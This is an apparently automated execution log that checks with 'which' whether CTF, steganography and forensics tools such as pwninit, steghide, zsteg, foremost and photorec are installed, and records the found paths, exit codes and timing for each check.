2025-10-24 01:26:45,287 - __main__ - INFO - 🔍 Cache MISS for command: which libc-database
2025-10-24 01:26:45,287 - __main__ - INFO - 🚀 EXECUTING: which libc-database
2025-10-24 01:26:45,287 - __main__ - INFO - ⏱️  TIMEOUT: 300s | PID: Starting...
2025-10-24 01:26:45,288 - __main__ - INFO - 🆔 PROCESS: PID 43213 started
2025-10-24 01:26:45,288 - __main__ - INFO - 🆔 REGISTERED: Process 43213 - which libc-database...
2025-10-24 01:26:45,288 - __main__ - INFO - ⚡ PROGRESS ⠋: [[38;5;196m[38;5;240m░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░[0m] [38;5;160m0.0%[0m Speed: 0 B/s | 0.0s | PID: 43213
2025-10-24 01:26:45,291 - __main__ - INFO - 🧹 CLEANUP: Process 43213 removed from registry
2025-10-24 01:26:45,291 - __main__ - WARNING - ⚠️  WARNING: Command completed with errors | Exit Code: 1 | Duration: 0.00s
2025-10-24 01:26:45,291 - __main__ - INFO - [38;5;46m[1m╭─────────────────────────────────────────────────────────────────────────────╮[0m
2025-10-24 01:26:45,291 - __main__ - INFO - [1m│[0m [38;5;196m📊 FINAL RESULTS ❌[0m
2025-10-24 01:26:45,291 - __main__ - INFO - [1m├─────────────────────────────────────────────────────────────────────────────┤[0m
2025-10-24 01:26:45,291 - __main__ - INFO - [1m│[0m [38;5;51m🚀 Command:[0m which libc-database
2025-10-24 01:26:45,291 - __main__ - INFO - [1m│[0m [38;5;208m⏱️  Duration:[0m 0.00s
2025-10-24 01:26:45,291 - __main__ - INFO - [1m│[0m [38;5;208m📊 Output Size:[0m 0 bytes
2025-10-24 01:26:45,291 - __main__ - INFO - [1m│[0m [38;5;129m🔢 Exit Code:[0m 1
2025-10-24 01:26:45,291 - __main__ - INFO - [1m│[0m [38;5;196m📈 Status:[0m FAILED | Cached: Yes
2025-10-24 01:26:45,291 - __main__ - INFO - [38;5;46m[1m╰─────────────────────────────────────────────────────────────────────────────╯[0m
2025-10-24 01:26:45,291 - __main__ - INFO - 🔍 Cache MISS for command: which pwninit
2025-10-24 01:26:45,291 - __main__ - INFO - 🚀 EXECUTING: which pwninit
2025-10-24 01:26:45,291 - __main__ - INFO - ⏱️  TIMEOUT: 300s | PID: Starting...
2025-10-24 01:26:45,292 - __main__ - INFO - 🆔 PROCESS: PID 43218 started
2025-10-24 01:26:45,292 - __main__ - INFO - 🆔 REGISTERED: Process 43218 - which pwninit...
2025-10-24 01:26:45,293 - __main__ - INFO - ⚡ PROGRESS ⠋: [[38;5;196m[38;5;240m░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░[0m] [38;5;160m0.0%[0m Speed: 0 B/s | 0.0s | PID: 43218
2025-10-24 01:26:45,294 - __main__ - INFO - 📤 STDOUT: /usr/local/bin/pwninit
2025-10-24 01:26:45,294 - __main__ - INFO - 🧹 CLEANUP: Process 43218 removed from registry
2025-10-24 01:26:45,294 - __main__ - INFO - ✅ SUCCESS: Command completed | Exit Code: 0 | Duration: 0.00s
2025-10-24 01:26:45,294 - __main__ - INFO - [38;5;46m[1m╭─────────────────────────────────────────────────────────────────────────────╮[0m
2025-10-24 01:26:45,294 - __main__ - INFO - [1m│[0m [38;5;46m📊 FINAL RESULTS ✅[0m
2025-10-24 01:26:45,294 - __main__ - INFO - [1m├─────────────────────────────────────────────────────────────────────────────┤[0m
2025-10-24 01:26:45,294 - __main__ - INFO - [1m│[0m [38;5;51m🚀 Command:[0m which pwninit
2025-10-24 01:26:45,294 - __main__ - INFO - [1m│[0m [38;5;208m⏱️  Duration:[0m 0.00s
2025-10-24 01:26:45,294 - __main__ - INFO - [1m│[0m [38;5;208m📊 Output Size:[0m 23 bytes
2025-10-24 01:26:45,294 - __main__ - INFO - [1m│[0m [38;5;129m🔢 Exit Code:[0m 0
2025-10-24 01:26:45,295 - __main__ - INFO - [1m│[0m [38;5;46m📈 Status:[0m SUCCESS | Cached: Yes
2025-10-24 01:26:45,295 - __main__ - INFO - [38;5;46m[1m╰─────────────────────────────────────────────────────────────────────────────╯[0m
2025-10-24 01:26:45,295 - __main__ - INFO - 💾 Cached result for command: which pwninit
2025-10-24 01:26:45,296 - __main__ - INFO - 🔍 Cache MISS for command: which steghide
2025-10-24 01:26:45,296 - __main__ - INFO - 🚀 EXECUTING: which steghide
2025-10-24 01:26:45,296 - __main__ - INFO - ⏱️  TIMEOUT: 300s | PID: Starting...
2025-10-24 01:26:45,297 - __main__ - INFO - 🆔 PROCESS: PID 43223 started
2025-10-24 01:26:45,297 - __main__ - INFO - 🆔 REGISTERED: Process 43223 - which steghide...
2025-10-24 01:26:45,298 - __main__ - INFO - ⚡ PROGRESS ⠋: [[38;5;196m[38;5;240m░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░[0m] [38;5;160m0.0%[0m Speed: 0 B/s | 0.0s | PID: 43223
2025-10-24 01:26:45,299 - __main__ - INFO - 📤 STDOUT: /usr/bin/steghide
2025-10-24 01:26:45,303 - __main__ - INFO - 🧹 CLEANUP: Process 43223 removed from registry
2025-10-24 01:26:45,303 - __main__ - INFO - ✅ SUCCESS: Command completed | Exit Code: 0 | Duration: 0.01s
2025-10-24 01:26:45,303 - __main__ - INFO - [38;5;46m[1m╭─────────────────────────────────────────────────────────────────────────────╮[0m
2025-10-24 01:26:45,303 - __main__ - INFO - [1m│[0m [38;5;46m📊 FINAL RESULTS ✅[0m
2025-10-24 01:26:45,303 - __main__ - INFO - [1m├─────────────────────────────────────────────────────────────────────────────┤[0m
2025-10-24 01:26:45,303 - __main__ - INFO - [1m│[0m [38;5;51m🚀 Command:[0m which steghide
2025-10-24 01:26:45,303 - __main__ - INFO - [1m│[0m [38;5;208m⏱️  Duration:[0m 0.01s
2025-10-24 01:26:45,303 - __main__ - INFO - [1m│[0m [38;5;208m📊 Output Size:[0m 18 bytes
2025-10-24 01:26:45,303 - __main__ - INFO - [1m│[0m [38;5;129m🔢 Exit Code:[0m 0
2025-10-24 01:26:45,303 - __main__ - INFO - [1m│[0m [38;5;46m📈 Status:[0m SUCCESS | Cached: Yes
2025-10-24 01:26:45,303 - __main__ - INFO - [38;5;46m[1m╰─────────────────────────────────────────────────────────────────────────────╯[0m
2025-10-24 01:26:45,303 - __main__ - INFO - 💾 Cached result for command: which steghide
2025-10-24 01:26:45,303 - __main__ - INFO - 🔍 Cache MISS for command: which hashpump
2025-10-24 01:26:45,303 - __main__ - INFO - 🚀 EXECUTING: which hashpump
2025-10-24 01:26:45,303 - __main__ - INFO - ⏱️  TIMEOUT: 300s | PID: Starting...
2025-10-24 01:26:45,304 - __main__ - INFO - 🆔 PROCESS: PID 43228 started
2025-10-24 01:26:45,304 - __main__ - INFO - 🆔 REGISTERED: Process 43228 - which hashpump...
2025-10-24 01:26:45,304 - __main__ - INFO - ⚡ PROGRESS ⠋: [[38;5;196m[38;5;240m░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░[0m] [38;5;160m0.0%[0m Speed: 0 B/s | 0.0s | PID: 43228
2025-10-24 01:26:45,307 - __main__ - INFO - 🧹 CLEANUP: Process 43228 removed from registry
2025-10-24 01:26:45,308 - __main__ - WARNING - ⚠️  WARNING: Command completed with errors | Exit Code: 1 | Duration: 0.00s
2025-10-24 01:26:45,308 - __main__ - INFO - [38;5;46m[1m╭─────────────────────────────────────────────────────────────────────────────╮[0m
2025-10-24 01:26:45,308 - __main__ - INFO - [1m│[0m [38;5;196m📊 FINAL RESULTS ❌[0m
2025-10-24 01:26:45,308 - __main__ - INFO - [1m├─────────────────────────────────────────────────────────────────────────────┤[0m
2025-10-24 01:26:45,308 - __main__ - INFO - [1m│[0m [38;5;51m🚀 Command:[0m which hashpump
2025-10-24 01:26:45,308 - __main__ - INFO - [1m│[0m [38;5;208m⏱️  Duration:[0m 0.00s
2025-10-24 01:26:45,308 - __main__ - INFO - [1m│[0m [38;5;208m📊 Output Size:[0m 0 bytes
2025-10-24 01:26:45,308 - __main__ - INFO - [1m│[0m [38;5;129m🔢 Exit Code:[0m 1
2025-10-24 01:26:45,308 - __main__ - INFO - [1m│[0m [38;5;196m📈 Status:[0m FAILED | Cached: Yes
2025-10-24 01:26:45,308 - __main__ - INFO - [38;5;46m[1m╰─────────────────────────────────────────────────────────────────────────────╯[0m
2025-10-24 01:26:45,308 - __main__ - INFO - 🔍 Cache MISS for command: which foremost
2025-10-24 01:26:45,308 - __main__ - INFO - 🚀 EXECUTING: which foremost
2025-10-24 01:26:45,308 - __main__ - INFO - ⏱️  TIMEOUT: 300s | PID: Starting...
2025-10-24 01:26:45,308 - __main__ - INFO - 🆔 PROCESS: PID 43233 started
2025-10-24 01:26:45,308 - __main__ - INFO - 🆔 REGISTERED: Process 43233 - which foremost...
2025-10-24 01:26:45,309 - __main__ - INFO - ⚡ PROGRESS ⠋: [[38;5;196m[38;5;240m░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░[0m] [38;5;160m0.0%[0m Speed: 0 B/s | 0.0s | PID: 43233
2025-10-24 01:26:45,310 - __main__ - INFO - 📤 STDOUT: /usr/bin/foremost
2025-10-24 01:26:45,313 - __main__ - INFO - 🧹 CLEANUP: Process 43233 removed from registry
2025-10-24 01:26:45,313 - __main__ - INFO - ✅ SUCCESS: Command completed | Exit Code: 0 | Duration: 0.00s
2025-10-24 01:26:45,313 - __main__ - INFO - [38;5;46m[1m╭─────────────────────────────────────────────────────────────────────────────╮[0m
2025-10-24 01:26:45,313 - __main__ - INFO - [1m│[0m [38;5;46m📊 FINAL RESULTS ✅[0m
2025-10-24 01:26:45,313 - __main__ - INFO - [1m├─────────────────────────────────────────────────────────────────────────────┤[0m
2025-10-24 01:26:45,313 - __main__ - INFO - [1m│[0m [38;5;51m🚀 Command:[0m which foremost
2025-10-24 01:26:45,313 - __main__ - INFO - [1m│[0m [38;5;208m⏱️  Duration:[0m 0.00s
2025-10-24 01:26:45,313 - __main__ - INFO - [1m│[0m [38;5;208m📊 Output Size:[0m 18 bytes
2025-10-24 01:26:45,313 - __main__ - INFO - [1m│[0m [38;5;129m🔢 Exit Code:[0m 0
2025-10-24 01:26:45,313 - __main__ - INFO - [1m│[0m [38;5;46m📈 Status:[0m SUCCESS | Cached: Yes
2025-10-24 01:26:45,313 - __main__ - INFO - [38;5;46m[1m╰─────────────────────────────────────────────────────────────────────────────╯[0m
2025-10-24 01:26:45,313 - __main__ - INFO - 💾 Cached result for command: which foremost
2025-10-24 01:26:45,313 - __main__ - INFO - 🔍 Cache MISS for command: which exiftool
2025-10-24 01:26:45,313 - __main__ - INFO - 🚀 EXECUTING: which exiftool
2025-10-24 01:26:45,313 - __main__ - INFO - ⏱️  TIMEOUT: 300s | PID: Starting...
2025-10-24 01:26:45,313 - __main__ - INFO - 🆔 PROCESS: PID 43238 started
2025-10-24 01:26:45,313 - __main__ - INFO - 🆔 REGISTERED: Process 43238 - which exiftool...
2025-10-24 01:26:45,314 - __main__ - INFO - ⚡ PROGRESS ⠋: [[38;5;196m[38;5;240m░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░[0m] [38;5;160m0.0%[0m Speed: 0 B/s | 0.0s | PID: 43238
2025-10-24 01:26:45,315 - __main__ - INFO - 📤 STDOUT: /usr/bin/exiftool
2025-10-24 01:26:45,318 - __main__ - INFO - 🧹 CLEANUP: Process 43238 removed from registry
2025-10-24 01:26:45,318 - __main__ - INFO - ✅ SUCCESS: Command completed | Exit Code: 0 | Duration: 0.01s
2025-10-24 01:26:45,318 - __main__ - INFO - [38;5;46m[1m╭─────────────────────────────────────────────────────────────────────────────╮[0m
2025-10-24 01:26:45,318 - __main__ - INFO - [1m│[0m [38;5;46m📊 FINAL RESULTS ✅[0m
2025-10-24 01:26:45,318 - __main__ - INFO - [1m├─────────────────────────────────────────────────────────────────────────────┤[0m
2025-10-24 01:26:45,318 - __main__ - INFO - [1m│[0m [38;5;51m🚀 Command:[0m which exiftool
2025-10-24 01:26:45,318 - __main__ - INFO - [1m│[0m [38;5;208m⏱️  Duration:[0m 0.01s
2025-10-24 01:26:45,318 - __main__ - INFO - [1m│[0m [38;5;208m📊 Output Size:[0m 18 bytes
2025-10-24 01:26:45,318 - __main__ - INFO - [1m│[0m [38;5;129m🔢 Exit Code:[0m 0
2025-10-24 01:26:45,318 - __main__ - INFO - [1m│[0m [38;5;46m📈 Status:[0m SUCCESS | Cached: Yes
2025-10-24 01:26:45,318 - __main__ - INFO - [38;5;46m[1m╰─────────────────────────────────────────────────────────────────────────────╯[0m
2025-10-24 01:26:45,318 - __main__ - INFO - 💾 Cached result for command: which exiftool
2025-10-24 01:26:45,318 - __main__ - INFO - 🔍 Cache MISS for command: which strings
2025-10-24 01:26:45,318 - __main__ - INFO - 🚀 EXECUTING: which strings
2025-10-24 01:26:45,318 - __main__ - INFO - ⏱️  TIMEOUT: 300s | PID: Starting...
2025-10-24 01:26:45,318 - __main__ - INFO - 🆔 PROCESS: PID 43243 started
2025-10-24 01:26:45,318 - __main__ - INFO - 🆔 REGISTERED: Process 43243 - which strings...
2025-10-24 01:26:45,320 - __main__ - INFO - ⚡ PROGRESS ⠋: [[38;5;196m[38;5;240m░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░[0m] [38;5;160m0.0%[0m Speed: 0 B/s | 0.0s | PID: 43243
2025-10-24 01:26:45,321 - __main__ - INFO - 📤 STDOUT: /usr/bin/strings
2025-10-24 01:26:45,324 - __main__ - INFO - 🧹 CLEANUP: Process 43243 removed from registry
2025-10-24 01:26:45,324 - __main__ - INFO - ✅ SUCCESS: Command completed | Exit Code: 0 | Duration: 0.01s
2025-10-24 01:26:45,324 - __main__ - INFO - [38;5;46m[1m╭─────────────────────────────────────────────────────────────────────────────╮[0m
2025-10-24 01:26:45,324 - __main__ - INFO - [1m│[0m [38;5;46m📊 FINAL RESULTS ✅[0m
2025-10-24 01:26:45,324 - __main__ - INFO - [1m├─────────────────────────────────────────────────────────────────────────────┤[0m
2025-10-24 01:26:45,324 - __main__ - INFO - [1m│[0m [38;5;51m🚀 Command:[0m which strings
2025-10-24 01:26:45,324 - __main__ - INFO - [1m│[0m [38;5;208m⏱️  Duration:[0m 0.01s
2025-10-24 01:26:45,324 - __main__ - INFO - [1m│[0m [38;5;208m📊 Output Size:[0m 17 bytes
2025-10-24 01:26:45,324 - __main__ - INFO - [1m│[0m [38;5;129m🔢 Exit Code:[0m 0
2025-10-24 01:26:45,324 - __main__ - INFO - [1m│[0m [38;5;46m📈 Status:[0m SUCCESS | Cached: Yes
2025-10-24 01:26:45,324 - __main__ - INFO - [38;5;46m[1m╰─────────────────────────────────────────────────────────────────────────────╯[0m
2025-10-24 01:26:45,324 - __main__ - INFO - 💾 Cached result for command: which strings
2025-10-24 01:26:45,324 - __main__ - INFO - 🔍 Cache MISS for command: which xxd
2025-10-24 01:26:45,324 - __main__ - INFO - 🚀 EXECUTING: which xxd
2025-10-24 01:26:45,324 - __main__ - INFO - ⏱️  TIMEOUT: 300s | PID: Starting...
2025-10-24 01:26:45,324 - __main__ - INFO - 🆔 PROCESS: PID 43248 started
2025-10-24 01:26:45,324 - __main__ - INFO - 🆔 REGISTERED: Process 43248 - which xxd...
2025-10-24 01:26:45,325 - __main__ - INFO - ⚡ PROGRESS ⠋: [[38;5;196m[38;5;240m░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░[0m] [38;5;160m0.0%[0m Speed: 0 B/s | 0.0s | PID: 43248
2025-10-24 01:26:45,327 - __main__ - INFO - 📤 STDOUT: /usr/bin/xxd
2025-10-24 01:26:45,330 - __main__ - INFO - 🧹 CLEANUP: Process 43248 removed from registry
2025-10-24 01:26:45,330 - __main__ - INFO - ✅ SUCCESS: Command completed | Exit Code: 0 | Duration: 0.01s
2025-10-24 01:26:45,330 - __main__ - INFO - [38;5;46m[1m╭─────────────────────────────────────────────────────────────────────────────╮[0m
2025-10-24 01:26:45,330 - __main__ - INFO - [1m│[0m [38;5;46m📊 FINAL RESULTS ✅[0m
2025-10-24 01:26:45,330 - __main__ - INFO - [1m├─────────────────────────────────────────────────────────────────────────────┤[0m
2025-10-24 01:26:45,330 - __main__ - INFO - [1m│[0m [38;5;51m🚀 Command:[0m which xxd
2025-10-24 01:26:45,330 - __main__ - INFO - [1m│[0m [38;5;208m⏱️  Duration:[0m 0.01s
2025-10-24 01:26:45,330 - __main__ - INFO - [1m│[0m [38;5;208m📊 Output Size:[0m 13 bytes
2025-10-24 01:26:45,330 - __main__ - INFO - [1m│[0m [38;5;129m🔢 Exit Code:[0m 0
2025-10-24 01:26:45,330 - __main__ - INFO - [1m│[0m [38;5;46m📈 Status:[0m SUCCESS | Cached: Yes
2025-10-24 01:26:45,330 - __main__ - INFO - [38;5;46m[1m╰─────────────────────────────────────────────────────────────────────────────╯[0m
2025-10-24 01:26:45,330 - __main__ - INFO - 💾 Cached result for command: which xxd
2025-10-24 01:26:45,330 - __main__ - INFO - 🔍 Cache MISS for command: which file
2025-10-24 01:26:45,330 - __main__ - INFO - 🚀 EXECUTING: which file
2025-10-24 01:26:45,330 - __main__ - INFO - ⏱️  TIMEOUT: 300s | PID: Starting...
2025-10-24 01:26:45,331 - __main__ - INFO - 🆔 PROCESS: PID 43253 started
2025-10-24 01:26:45,331 - __main__ - INFO - 🆔 REGISTERED: Process 43253 - which file...
2025-10-24 01:26:45,331 - __main__ - INFO - ⚡ PROGRESS ⠋: [[38;5;196m[38;5;240m░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░[0m] [38;5;160m0.0%[0m Speed: 0 B/s | 0.0s | PID: 43253
2025-10-24 01:26:45,333 - __main__ - INFO - 📤 STDOUT: /usr/bin/file
2025-10-24 01:26:45,336 - __main__ - INFO - 🧹 CLEANUP: Process 43253 removed from registry
2025-10-24 01:26:45,336 - __main__ - INFO - ✅ SUCCESS: Command completed | Exit Code: 0 | Duration: 0.01s
2025-10-24 01:26:45,336 - __main__ - INFO - [38;5;46m[1m╭─────────────────────────────────────────────────────────────────────────────╮[0m
2025-10-24 01:26:45,336 - __main__ - INFO - [1m│[0m [38;5;46m📊 FINAL RESULTS ✅[0m
2025-10-24 01:26:45,336 - __main__ - INFO - [1m├─────────────────────────────────────────────────────────────────────────────┤[0m
2025-10-24 01:26:45,336 - __main__ - INFO - [1m│[0m [38;5;51m🚀 Command:[0m which file
2025-10-24 01:26:45,336 - __main__ - INFO - [1m│[0m [38;5;208m⏱️  Duration:[0m 0.01s
2025-10-24 01:26:45,336 - __main__ - INFO - [1m│[0m [38;5;208m📊 Output Size:[0m 14 bytes
2025-10-24 01:26:45,336 - __main__ - INFO - [1m│[0m [38;5;129m🔢 Exit Code:[0m 0
2025-10-24 01:26:45,336 - __main__ - INFO - [1m│[0m [38;5;46m📈 Status:[0m SUCCESS | Cached: Yes
2025-10-24 01:26:45,336 - __main__ - INFO - [38;5;46m[1m╰─────────────────────────────────────────────────────────────────────────────╯[0m
2025-10-24 01:26:45,336 - __main__ - INFO - 💾 Cached result for command: which file
2025-10-24 01:26:45,336 - __main__ - INFO - 🔍 Cache MISS for command: which photorec
2025-10-24 01:26:45,336 - __main__ - INFO - 🚀 EXECUTING: which photorec
2025-10-24 01:26:45,336 - __main__ - INFO - ⏱️  TIMEOUT: 300s | PID: Starting...
2025-10-24 01:26:45,337 - __main__ - INFO - 🆔 PROCESS: PID 43258 started
2025-10-24 01:26:45,337 - __main__ - INFO - 🆔 REGISTERED: Process 43258 - which photorec...
2025-10-24 01:26:45,337 - __main__ - INFO - ⚡ PROGRESS ⠋: [[38;5;196m[38;5;240m░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░[0m] [38;5;160m0.0%[0m Speed: 0 B/s | 0.0s | PID: 43258
2025-10-24 01:26:45,340 - __main__ - INFO - 📤 STDOUT: /usr/bin/photorec
2025-10-24 01:26:45,341 - __main__ - INFO - 🧹 CLEANUP: Process 43258 removed from registry
2025-10-24 01:26:45,341 - __main__ - INFO - ✅ SUCCESS: Command completed | Exit Code: 0 | Duration: 0.01s
2025-10-24 01:26:45,342 - __main__ - INFO - [38;5;46m[1m╭─────────────────────────────────────────────────────────────────────────────╮[0m
2025-10-24 01:26:45,342 - __main__ - INFO - [1m│[0m [38;5;46m📊 FINAL RESULTS ✅[0m
2025-10-24 01:26:45,342 - __main__ - INFO - [1m├─────────────────────────────────────────────────────────────────────────────┤[0m
2025-10-24 01:26:45,342 - __main__ - INFO - [1m│[0m [38;5;51m🚀 Command:[0m which photorec
2025-10-24 01:26:45,342 - __main__ - INFO - [1m│[0m [38;5;208m⏱️  Duration:[0m 0.01s
2025-10-24 01:26:45,342 - __main__ - INFO - [1m│[0m [38;5;208m📊 Output Size:[0m 18 bytes
2025-10-24 01:26:45,342 - __main__ - INFO - [1m│[0m [38;5;129m🔢 Exit Code:[0m 0
2025-10-24 01:26:45,342 - __main__ - INFO - [1m│[0m [38;5;46m📈 Status:[0m SUCCESS | Cached: Yes
2025-10-24 01:26:45,342 - __main__ - INFO - [38;5;46m[1m╰─────────────────────────────────────────────────────────────────────────────╯[0m
2025-10-24 01:26:45,342 - __main__ - INFO - 💾 Cached result for command: which photorec
2025-10-24 01:26:45,342 - __main__ - INFO - 🔍 Cache MISS for command: which testdisk
2025-10-24 01:26:45,342 - __main__ - INFO - 🚀 EXECUTING: which testdisk
2025-10-24 01:26:45,342 - __main__ - INFO - ⏱️  TIMEOUT: 300s | PID: Starting...
2025-10-24 01:26:45,342 - __main__ - INFO - 🆔 PROCESS: PID 43263 started
2025-10-24 01:26:45,342 - __main__ - INFO - 🆔 REGISTERED: Process 43263 - which testdisk...
2025-10-24 01:26:45,343 - __main__ - INFO - ⚡ PROGRESS ⠋: [[38;5;196m[38;5;240m░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░[0m] [38;5;160m0.0%[0m Speed: 0 B/s | 0.0s | PID: 43263
2025-10-24 01:26:45,345 - __main__ - INFO - 📤 STDOUT: /usr/bin/testdisk
2025-10-24 01:26:45,346 - __main__ - INFO - 🧹 CLEANUP: Process 43263 removed from registry
2025-10-24 01:26:45,346 - __main__ - INFO - ✅ SUCCESS: Command completed | Exit Code: 0 | Duration: 0.00s
2025-10-24 01:26:45,346 - __main__ - INFO - [38;5;46m[1m╭─────────────────────────────────────────────────────────────────────────────╮[0m
2025-10-24 01:26:45,346 - __main__ - INFO - [1m│[0m [38;5;46m📊 FINAL RESULTS ✅[0m
2025-10-24 01:26:45,346 - __main__ - INFO - [1m├─────────────────────────────────────────────────────────────────────────────┤[0m
2025-10-24 01:26:45,346 - __main__ - INFO - [1m│[0m [38;5;51m🚀 Command:[0m which testdisk
2025-10-24 01:26:45,346 - __main__ - INFO - [1m│[0m [38;5;208m⏱️  Duration:[0m 0.00s
2025-10-24 01:26:45,346 - __main__ - INFO - [1m│[0m [38;5;208m📊 Output Size:[0m 18 bytes
2025-10-24 01:26:45,346 - __main__ - INFO - [1m│[0m [38;5;129m🔢 Exit Code:[0m 0
2025-10-24 01:26:45,346 - __main__ - INFO - [1m│[0m [38;5;46m📈 Status:[0m SUCCESS | Cached: Yes
2025-10-24 01:26:45,346 - __main__ - INFO - [38;5;46m[1m╰─────────────────────────────────────────────────────────────────────────────╯[0m
2025-10-24 01:26:45,346 - __main__ - INFO - 💾 Cached result for command: which testdisk
2025-10-24 01:26:45,346 - __main__ - INFO - 🔍 Cache MISS for command: which scalpel
2025-10-24 01:26:45,346 - __main__ - INFO - 🚀 EXECUTING: which scalpel
2025-10-24 01:26:45,346 - __main__ - INFO - ⏱️  TIMEOUT: 300s | PID: Starting...
2025-10-24 01:26:45,347 - __main__ - INFO - 🆔 PROCESS: PID 43268 started
2025-10-24 01:26:45,347 - __main__ - INFO - 🆔 REGISTERED: Process 43268 - which scalpel...
2025-10-24 01:26:45,348 - __main__ - INFO - ⚡ PROGRESS ⠋: [[38;5;196m[38;5;240m░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░[0m] [38;5;160m0.0%[0m Speed: 0 B/s | 0.0s | PID: 43268
2025-10-24 01:26:45,349 - __main__ - INFO - 📤 STDOUT: /usr/bin/scalpel
2025-10-24 01:26:45,352 - __main__ - INFO - 🧹 CLEANUP: Process 43268 removed from registry
2025-10-24 01:26:45,352 - __main__ - INFO - ✅ SUCCESS: Command completed | Exit Code: 0 | Duration: 0.01s
2025-10-24 01:26:45,352 - __main__ - INFO - [38;5;46m[1m╭─────────────────────────────────────────────────────────────────────────────╮[0m
2025-10-24 01:26:45,352 - __main__ - INFO - [1m│[0m [38;5;46m📊 FINAL RESULTS ✅[0m
2025-10-24 01:26:45,352 - __main__ - INFO - [1m├─────────────────────────────────────────────────────────────────────────────┤[0m
2025-10-24 01:26:45,352 - __main__ - INFO - [1m│[0m [38;5;51m🚀 Command:[0m which scalpel
2025-10-24 01:26:45,352 - __main__ - INFO - [1m│[0m [38;5;208m⏱️  Duration:[0m 0.01s
2025-10-24 01:26:45,352 - __main__ - INFO - [1m│[0m [38;5;208m📊 Output Size:[0m 17 bytes
2025-10-24 01:26:45,352 - __main__ - INFO - [1m│[0m [38;5;129m🔢 Exit Code:[0m 0
2025-10-24 01:26:45,352 - __main__ - INFO - [1m│[0m [38;5;46m📈 Status:[0m SUCCESS | Cached: Yes
2025-10-24 01:26:45,352 - __main__ - INFO - [38;5;46m[1m╰─────────────────────────────────────────────────────────────────────────────╯[0m
2025-10-24 01:26:45,352 - __main__ - INFO - 💾 Cached result for command: which scalpel
2025-10-24 01:26:45,352 - __main__ - INFO - 🔍 Cache MISS for command: which zsteg
2025-10-24 01:26:45,352 - __main__ - INFO - 🚀 EXECUTING: which zsteg
2025-10-24 01:26:45,353 - __main__ - INFO - ⏱️  TIMEOUT: 300s | PID: Starting...
2025-10-24 01:26:45,353 - __main__ - INFO - 🆔 PROCESS: PID 43273 started
2025-10-24 01:26:45,353 - __main__ - INFO - 🆔 REGISTERED: Process 43273 - which zsteg...
2025-10-24 01:26:45,354 - __main__ - INFO - ⚡ PROGRESS ⠋: [[38;5;196m[38;5;240m░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░[0m] [38;5;160m0.0%[0m Speed: 0 B/s | 0.0s | PID: 43273
2025-10-24 01:26:45,355 - __main__ - INFO - 📤 STDOUT: /usr/local/bin/zsteg
2025-10-24 01:26:45,358 - __main__ - INFO - 🧹 CLEANUP: Process 43273 removed from registry
2025-10-24 01:26:45,358 - __main__ - INFO - ✅ SUCCESS: Command completed | Exit Code: 0 | Duration: 0.01s
2025-10-24 01:26:45,358 - __main__ - INFO - [38;5;46m[1m╭─────────────────────────────────────────────────────────────────────────────╮[0m
2025-10-24 01:26:45,358 - __main__ - INFO - [1m│[0m [38;5;46m📊 FINAL RESULTS ✅[0m
2025-10-24 01:26:45,358 - __main__ - INFO - [1m├─────────────────────────────────────────────────────────────────────────────┤[0m
2025-10-24 01:26:45,358 - __main__ - INFO - [1m│[0m [38;5;51m🚀 Command:[0m which zsteg
2025-10-24 01:26:45,358 - __main__ - INFO - [1m│[0m [38;5;208m⏱️  Duration:[0m 0.01s
2025-10-24 01:26:45,358 - __main__ - INFO - [1m│[0m [38;5;208m📊 Output Size:[0m 21 bytes
2025-10-24 01:26:45,358 - __main__ - INFO - [1m│[0m [38;5;129m🔢 Exit Code:[0m 0
2025-10-24 01:26:45,358 - __main__ - INFO - [1m│[0m [38;5;46m📈 Status:[0m SUCCESS | Cached: Yes
2025-10-24 01:26:45,358 - __main__ - INFO - [38;5;46m[1m╰─────────────────────────────────────────────────────────────────────────────╯[0m
2025-10-24 01:26:45,358 - __main__ - INFO - 💾 Cached result for command: which zsteg
2025-10-24 01:26:45,358 - __main__ - INFO - 🔍 Cache MISS for command: which outguess
2025-10-24 01:26:45,358 - __main__ - INFO - 🚀 EXECUTING: which outguess
2025-10-24 01:26:45,358 - __main__ - INFO - ⏱️  TIMEOUT: 300s | PID: Starting...
2025-10-24 01:26:45,359 - __main__ - INFO - 🆔 PROCESS: PID 43278 started
2025-10-24 01:26:45,359 - __main__ - INFO - 🆔 REGISTERED: Process 43278 - which outguess...
2025-10-24 01:26:45,359 - __main__ - INFO - ⚡ PROGRESS ⠋: [[38;5;196m[38;5;240m░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░[0m] [38;5;160m0.0%[0m Speed: 0 B/s | 0.0s | PID: 43278
2025-10-24 01:26:45,361 - __main__ - INFO - 📤 STDOUT: /usr/bin/outguess
2025-10-24 01:26:45,364 - __main__ - INFO - 🧹 CLEANUP: Process 43278 removed from registry
2025-10-24 01:26:45,364 - __main__ - INFO - ✅ SUCCESS: Command completed | Exit Code: 0 | Duration: 0.01s
2025-10-24 01:26:45,364 - __main__ - INFO - [38;5;46m[1m╭─────────────────────────────────────────────────────────────────────────────╮[0m
2025-10-24 01:26:45,364 - __main__ - INFO - [1m│[0m [38;5;46m📊 FINAL RESULTS ✅[0m
2025-10-24 01:26:45,364 - __main__ - INFO - [1m├─────────────────────────────────────────────────────────────────────────────┤[0m
2025-10-24 01:26:45,364 - __main__ - INFO - [1m│[0m [38;5;51m🚀 Command:[0m which outguess
2025-10-24 01:26:45,364 - __main__ - INFO - [1m│[0m [38;5;208m⏱️  Duration:[0m 0.01s
2025-10-24 01:26:45,364 - __main__ - INFO - [1m│[0m [38;5;208m📊 Output Size:[0m 18 bytes
2025-10-24 01:26:45,364 - __main__ - INFO - [1m│[0m [38;5;129m🔢 Exit Code:[0m 0
2025-10-24 01:26:45,364 - __main__ - INFO - [1m│[0m [38;5;46m📈 Status:[0m SUCCESS | Cached: Yes
2025-10-24 01:26:45,364 - __main__ - INFO - [38;5;46m[1m╰─────────────────────────────────────────────────────────────────────────────╯[0m
2025-10-24 01:26:45,364 - __main__ - INFO - 💾 Cached result for command: which outguess
